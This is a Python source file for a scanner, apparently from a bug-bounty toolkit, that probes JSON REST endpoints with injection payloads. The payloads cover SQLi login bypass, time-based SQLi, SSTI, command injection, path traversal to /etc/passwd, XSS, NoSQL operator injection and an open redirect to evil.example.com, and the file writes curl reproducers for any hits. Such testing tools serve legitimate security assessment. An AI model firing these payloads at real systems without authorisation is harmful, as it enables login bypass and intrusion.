#!/usr/bin/env python3
"""POST-JSON injection probe.

Closes the scanner gap where sqli/auth_bypass lanes only test GET ?param=
URLs and miss the modern attack surface of REST APIs with JSON bodies (e.g.
Juice Shop `/rest/user/login` SQLi via `email`: `' OR 1=1--`).

Workflow:
  1. Collect target endpoints (either via --endpoints-file or by reading
     js_intel hypotheses for POST patterns).
  2. For each endpoint with discovered JSON fields, send a baseline POST and
     a series of injection payloads (SQLi / SSTI / cmd-inj / open-redirect /
     auth-bypass) per string field.
  3. Three-stage detection:
       a. strong-signal: JWT-shaped token + admin role markers in response
          (only for auth endpoints with payloads designed to log in)
       b. SQL-error fingerprint + structural diff > 20%
       c. time delay > 4s when payload includes SLEEP(5)
  4. Write per-hit JSON + curl reproducer under findings/<t>/poc/json_inject/

Designed to be safe (read-only / login-style probes), bounded by request count
limits, fail-open on network errors.

CLI:
    python3 -m tools.json_inject_probe \
        --target localhost:3000 \
        --endpoints recon/localhost:3000/browser/xhr_endpoints.txt \
        [--js-intel findings/localhost:3000/js_intel/hypotheses.json] \
        [--max-requests 60]
"""

from __future__ import annotations

import argparse
import hashlib
import json
import os
import re
import sys
import time
import urllib.parse
import urllib.request
from pathlib import Path

TOOLS_DIR = Path(__file__).resolve().parent
BASE_DIR = TOOLS_DIR.parent

try:
    from tools.target_paths import target_storage_key
except ImportError:  # pragma: no cover
    sys.path.insert(0, str(TOOLS_DIR))
    from target_paths import target_storage_key  # type: ignore

USER_AGENT = "claude-bug-bounty/json_inject_probe"

# Payload library (one per attack class — kept tight on purpose).
PAYLOADS: list[dict] = [
    {"class": "sqli_auth_bypass", "value": "' OR 1=1--", "field_hint": "email|user|login|name|account"},
    {"class": "sqli_error", "value": "'", "field_hint": ".*"},
    {"class": "sqli_time", "value": "1' AND SLEEP(5)-- -", "field_hint": ".*", "expect": "time>=4"},
    {"class": "ssti", "value": "{{7*7}}", "field_hint": ".*"},
    {"class": "cmd_injection", "value": "127.0.0.1;id", "field_hint": "host|ip|target|server|url"},
    {"class": "open_redirect", "value": "https://evil.example.com", "field_hint": "url|redirect|return|next|to|callback"},
    {"class": "path_traversal", "value": "../../etc/passwd", "field_hint": "file|path|page|template|name"},
    {"class": "xss", "value": "<svg/onload=alert(1)>", "field_hint": ".*"},
    # NoSQL operator injection — sends a dict where the server expects a string.
    # Mongo/Mongoose treat {"$ne": null} as "not equal null" → matches any record.
    {"class": "nosql_op_injection", "value": {"$ne": None}, "field_hint": "password|pwd|secret|token|email|user|login"},
    # NoSQL regex bypass — wildcard regex matches every row for the field.
    {"class": "nosql_regex_bypass", "value": {"$regex": ".*"}, "field_hint": "email|user|login|name|account|username"},
    # GraphQL introspection probe — fires only on `query`-shaped fields. Many
    # GraphQL gateways accept POST {"query": "..."} on /graphql and leak the
    # full schema when introspection is left enabled in production.
    {"class": "graphql_introspection", "value": "{ __schema { types { name } } }", "field_hint": "query|gql|graphql"},
]

# Strong-signal regexes scanned in response bodies.
JWT_RE = re.compile(r"eyJ[A-Za-z0-9_-]{6,}\.[A-Za-z0-9_-]{6,}\.[A-Za-z0-9_-]{6,}")
ADMIN_ROLE_RE = re.compile(r'"role"\s*:\s*"(admin|root|superuser)"', re.I)
SQL_ERROR_RE = re.compile(
    r"SQLITE_ERROR|SQL syntax|sqlite3\.|ORA-\d+|mysqli?_\w+|PG::\w+|near \"[^\"]*\": syntax error|"
    r"unterminated quoted string|Unclosed quotation mark",
    re.I,
)
SSTI_PROOF_RE = re.compile(r"\b49\b")
CMD_PROOF_RE = re.compile(r"uid=\d+\([^)]+\)|gid=\d+|groups=", re.I)
PATH_PROOF_RE = re.compile(r"root:[x*]:0:0:", re.I)
XSS_REFLECT_RE = re.compile(r"<svg/onload=alert\(1\)>")
# GraphQL introspection success — both keys must appear together so we don't
# false-positive on a 404 page that happens to mention "__schema".
GRAPHQL_INTROSPECTION_RE = re.compile(r'"__schema"\s*:\s*\{|"types"\s*:\s*\[\s*\{\s*"name"', re.I)
# Class groups that share a detection signal.
AUTH_BYPASS_CLASSES = ("sqli_auth_bypass", "nosql_op_injection", "nosql_regex_bypass")


# ---------------------------------------------------------------------------
# Endpoint discovery


def _collect_endpoints(args: argparse.Namespace) -> list[dict]:
    """Return [{method, url, body_template, fields}]."""
    endpoints: list[dict] = []
    seen_urls: set[str] = set()

    if args.endpoints_file:
        ep_path = Path(args.endpoints_file).expanduser().resolve()
        if ep_path.is_file():
            for line in ep_path.read_text(encoding="utf-8", errors="replace").splitlines():
                line = line.strip()
                if not line or line in seen_urls:
                    continue
                # Accept either bare URL or JSON {"method":"POST","url":"..."}
                if line.startswith("{"):
                    try:
                        item = json.loads(line)
                    except Exception:
                        continue
                    url = item.get("url")
                    method = (item.get("method") or "POST").upper()
                    body = item.get("body") or item.get("request_body") or {}
                else:
                    if not line.startswith(("http://", "https://")):
                        continue
                    url = line
                    method = "POST"
                    body = {}
                if not url or url in seen_urls:
                    continue
                seen_urls.add(url)
                endpoints.append({"method": method, "url": url, "body_template": body, "source": "endpoints_file"})

    # Pull common login/auth POST endpoints from js_intel hypotheses as a default
    # set when nothing more concrete was supplied. We hand-curate the fields so
    # the probe does not blindly explode parameter combinations.
    if args.js_intel:
        ji_path = Path(args.js_intel).expanduser().resolve()
        if ji_path.is_file():
            try:
                ji = json.loads(ji_path.read_text(encoding="utf-8"))
            except Exception:
                ji = {}
            base = f"http://{args.target}" if "://" not in args.target else args.target.rstrip("/")
            for path, template in _login_seeds_from_js_intel(ji):
                url = base + path
                if url in seen_urls:
                    continue
                seen_urls.add(url)
                endpoints.append({"method": "POST", "url": url, "body_template": template, "source": "js_intel_seed"})

    # Heuristic baseline seeds for any target — covers common REST login shapes.
    if not endpoints and args.add_default_seeds:
        base = f"http://{args.target}" if "://" not in args.target else args.target.rstrip("/")
        for path, template in DEFAULT_LOGIN_SEEDS:
            endpoints.append({"method": "POST", "url": base + path, "body_template": template, "source": "default_seed"})

    return endpoints


DEFAULT_LOGIN_SEEDS: list[tuple[str, dict]] = [
    ("/rest/user/login", {"email": "test@test", "password": "x"}),
    ("/api/login", {"username": "test", "password": "x"}),
    ("/api/auth/login", {"username": "test", "password": "x"}),
    ("/login", {"username": "test", "password": "x"}),
    ("/auth/login", {"email": "test@test", "password": "x"}),
]


def _login_seeds_from_js_intel(ji: dict) -> list[tuple[str, dict]]:
    """Pull plausible login endpoints from js_intel and pair with a template body."""
    seeds: list[tuple[str, dict]] = []
    rest = ji.get("endpoints", {}).get("rest_custom", []) if isinstance(ji, dict) else []
    rest_api = ji.get("endpoints", {}).get("rest_api_crud", []) if isinstance(ji, dict) else []
    pool = list(rest) + list(rest_api)
    for ep in pool:
        if not isinstance(ep, str):
            continue
        lower = ep.lower()
        if "login" in lower or "auth" in lower or "signin" in lower:
            seeds.append((ep, {"email": "test@test", "password": "x"}))
        elif "register" in lower or "signup" in lower:
            seeds.append((ep, {"email": "test@test", "password": "x", "username": "tester"}))
    return seeds


# ---------------------------------------------------------------------------
# HTTP plumbing


def _http_post_json(url: str, body: dict, timeout: float = 10.0) -> dict:
    """Return {status, body_text, body_size, latency, error}."""
    data = json.dumps(body).encode("utf-8")
    req = urllib.request.Request(
        url,
        data=data,
        headers={
            "User-Agent": USER_AGENT,
            "Content-Type": "application/json",
            "Accept": "application/json,text/html;q=0.9,*/*;q=0.1",
        },
        method="POST",
    )
    t0 = time.time()
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            raw = resp.read(64 * 1024)
            return {
                "status": resp.status,
                "body_text": raw.decode("utf-8", errors="replace"),
                "body_size": len(raw),
                "latency": time.time() - t0,
                "error": None,
            }
    except urllib.error.HTTPError as e:
        try:
            raw = e.read(64 * 1024)
        except Exception:
            raw = b""
        return {
            "status": e.code,
            "body_text": raw.decode("utf-8", errors="replace"),
            "body_size": len(raw),
            "latency": time.time() - t0,
            "error": None,
        }
    except Exception as exc:
        return {
            "status": 0,
            "body_text": "",
            "body_size": 0,
            "latency": time.time() - t0,
            "error": f"{type(exc).__name__}:{exc}",
        }


def _curl_reproducer(url: str, body: dict) -> str:
    body_str = json.dumps(body).replace("'", "'\\''")
    return f"curl -sk -X POST '{url}' -H 'Content-Type: application/json' -d '{body_str}'"


# ---------------------------------------------------------------------------
# Probe logic


def _detect_hit(payload_class: str, baseline: dict, response: dict, payload_value: str) -> dict:
    """Return {hit: bool, signal: str, evidence: str}."""
    out = {"hit": False, "signal": "", "evidence": ""}
    body = response.get("body_text", "")
    base_body = baseline.get("body_text", "")

    # Strong signal A: JWT + admin role appeared (login bypass via SQLi or NoSQL operator/regex)
    jwt = JWT_RE.search(body)
    role = ADMIN_ROLE_RE.search(body) or ADMIN_ROLE_RE.search(_decode_jwt_payload(jwt.group(0)) if jwt else "")
    if jwt and payload_class in AUTH_BYPASS_CLASSES:
        out["hit"] = True
        if payload_class == "sqli_auth_bypass":
            out["signal"] = "auth_bypass_jwt_returned"
        else:
            out["signal"] = f"{payload_class}_jwt_returned"
        out["evidence"] = f"jwt_prefix={jwt.group(0)[:40]}...; role_match={'yes' if role else 'unknown'}"
        return out

    # Strong signal B: SQL error fingerprint
    if payload_class in ("sqli_error", "sqli_auth_bypass") and SQL_ERROR_RE.search(body):
        out["hit"] = True
        out["signal"] = "sql_error_fingerprint"
        out["evidence"] = SQL_ERROR_RE.search(body).group(0)[:120]
        return out

    # Strong signal C: time-based blind SQLi
    if payload_class == "sqli_time" and response.get("latency", 0) >= 4.0 and baseline.get("latency", 0) < 2.0:
        out["hit"] = True
        out["signal"] = "sqli_time_delay"
        out["evidence"] = f"baseline={baseline['latency']:.2f}s probe={response['latency']:.2f}s"
        return out

    # Strong signal D: SSTI execution (7*7=49)
    if payload_class == "ssti" and SSTI_PROOF_RE.search(body) and not SSTI_PROOF_RE.search(base_body):
        out["hit"] = True
        out["signal"] = "ssti_evaluation"
        out["evidence"] = "response contains 49 (7*7) where baseline did not"
        return out

    # Strong signal E: command injection
    if payload_class == "cmd_injection" and CMD_PROOF_RE.search(body):
        out["hit"] = True
        out["signal"] = "cmd_injection_uid_disclosure"
        out["evidence"] = CMD_PROOF_RE.search(body).group(0)
        return out

    # Strong signal F: path traversal hit
    if payload_class == "path_traversal" and PATH_PROOF_RE.search(body):
        out["hit"] = True
        out["signal"] = "path_traversal_etc_passwd"
        out["evidence"] = "/etc/passwd content detected in response"
        return out

    # Strong signal G: XSS reflection of payload verbatim
    if payload_class == "xss" and XSS_REFLECT_RE.search(body):
        out["hit"] = True
        out["signal"] = "xss_reflection"
        out["evidence"] = "payload reflected verbatim"
        return out

    # Strong signal H: open redirect (302/3xx with Location matching payload)
    # (urllib follows redirects; this is best-effort via body / status only.)
    if payload_class == "open_redirect" and response.get("status") in (301, 302, 303, 307, 308):
        if payload_value in body or "evil.example.com" in body:
            out["hit"] = True
            out["signal"] = "open_redirect_external_location"
            out["evidence"] = f"3xx with payload echoed (status={response['status']})"
            return out

    # Strong signal I: GraphQL introspection enabled. The schema leak is itself
    # a Medium finding (priv-esc playbook + hidden mutation discovery), so we
    # require the baseline to NOT contain the introspection markers to avoid
    # false-positives on GraphQL playgrounds that 200/echo on any request.
    if payload_class == "graphql_introspection":
        if GRAPHQL_INTROSPECTION_RE.search(body) and not GRAPHQL_INTROSPECTION_RE.search(base_body):
            out["hit"] = True
            out["signal"] = "graphql_introspection_enabled"
            match = GRAPHQL_INTROSPECTION_RE.search(body)
            out["evidence"] = f"introspection marker present: {match.group(0)[:80]}"
            return out

    return out


def _decode_jwt_payload(jwt: str) -> str:
    try:
        parts = jwt.split(".")
        if len(parts) < 2:
            return ""
        import base64
        seg = parts[1] + "=" * (-len(parts[1]) % 4)
        return base64.urlsafe_b64decode(seg).decode("utf-8", errors="replace")
    except Exception:
        return ""


def _field_eligible(field: str, payload: dict) -> bool:
    hint = payload.get("field_hint") or ".*"
    return bool(re.search(hint, field, re.I))


def probe_endpoint(endpoint: dict, max_requests: int) -> list[dict]:
    url = endpoint["url"]
    body_template = endpoint.get("body_template") or {}
    if not isinstance(body_template, dict) or not body_template:
        return []

    # baseline call
    baseline = _http_post_json(url, body_template)
    request_count = 1
    hits: list[dict] = []

    string_fields = [k for k, v in body_template.items() if isinstance(v, (str, int)) or v is None]
    for payload in PAYLOADS:
        for field in string_fields:
            if not _field_eligible(field, payload):
                continue
            if request_count >= max_requests:
                return hits
            mutated = dict(body_template)
            mutated[field] = payload["value"]
            resp = _http_post_json(url, mutated, timeout=12.0 if payload["class"] == "sqli_time" else 8.0)
            request_count += 1
            detection = _detect_hit(payload["class"], baseline, resp, payload["value"])
            if detection["hit"]:
                hits.append({
                    "url": url,
                    "method": "POST",
                    "field": field,
                    "payload_class": payload["class"],
                    "payload_value": payload["value"],
                    "signal": detection["signal"],
                    "evidence": detection["evidence"],
                    "response_status": resp["status"],
                    "response_size": resp["body_size"],
                    "response_excerpt": resp["body_text"][:280],
                    "curl": _curl_reproducer(url, mutated),
                })
    return hits


# ---------------------------------------------------------------------------
# Output writer


def _write_findings(target: str, hits: list[dict]) -> dict:
    target_key = target_storage_key(target)
    out_dir = BASE_DIR / "findings" / target_key / "poc" / "json_inject"
    out_dir.mkdir(parents=True, exist_ok=True)
    written: list[str] = []
    for hit in hits:
        slug_url = re.sub(r"[^A-Za-z0-9._-]+", "_", urllib.parse.urlparse(hit["url"]).path).strip("_") or "root"
        fname = f"{hit['payload_class']}_{slug_url}_{hit['field']}.json"
        path = out_dir / fname
        path.write_text(json.dumps(hit, indent=2, sort_keys=True) + "\n", encoding="utf-8")
        written.append(str(path))
    summary_path = out_dir / "summary.json"
    summary_path.write_text(
        json.dumps(
            {
                "target": target,
                "hit_count": len(hits),
                "generated_at": int(time.time()),
                "hits": [
                    {"url": h["url"], "field": h["field"], "class": h["payload_class"], "signal": h["signal"]}
                    for h in hits
                ],
            },
            indent=2,
        ),
        encoding="utf-8",
    )
    return {"out_dir": str(out_dir), "summary": str(summary_path), "files": written}


# ---------------------------------------------------------------------------
# CLI


def main() -> int:
    parser = argparse.ArgumentParser(description="POST-JSON injection probe — covers REST-API JSON-body attack surface")
    parser.add_argument("--target", required=True, help="Target host or host:port (used for storage path + default seeds)")
    parser.add_argument("--endpoints-file", default="", help="File with one URL per line OR JSONL of {method,url,body}")
    parser.add_argument("--js-intel", default="", help="Path to findings/<t>/js_intel/hypotheses.json for endpoint seeds")
    parser.add_argument("--add-default-seeds", action="store_true", default=True,
                        help="When no other source provides endpoints, probe common login paths")
    parser.add_argument("--max-requests", type=int, default=60, help="Hard cap on total probe requests per endpoint")
    args = parser.parse_args()

    endpoints = _collect_endpoints(args)
    if not endpoints:
        print("[json_inject] no endpoints to probe — pass --endpoints-file or --js-intel", file=sys.stderr)
        return 1

    print(f"[json_inject] probing {len(endpoints)} endpoint(s) for target={args.target}", file=sys.stderr)
    all_hits: list[dict] = []
    for ep in endpoints:
        print(f"[json_inject]  -> {ep['method']} {ep['url']} (source={ep.get('source')})", file=sys.stderr)
        hits = probe_endpoint(ep, max_requests=args.max_requests)
        if hits:
            print(f"[json_inject]     {len(hits)} hit(s)", file=sys.stderr)
            all_hits.extend(hits)

    if not all_hits:
        print("[json_inject] no injection hits — check endpoint shapes / try --js-intel for richer surface", file=sys.stderr)
        return 0

    result = _write_findings(args.target, all_hits)
    print(json.dumps({"status": "ok", "hit_count": len(all_hits), **result}, indent=2))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
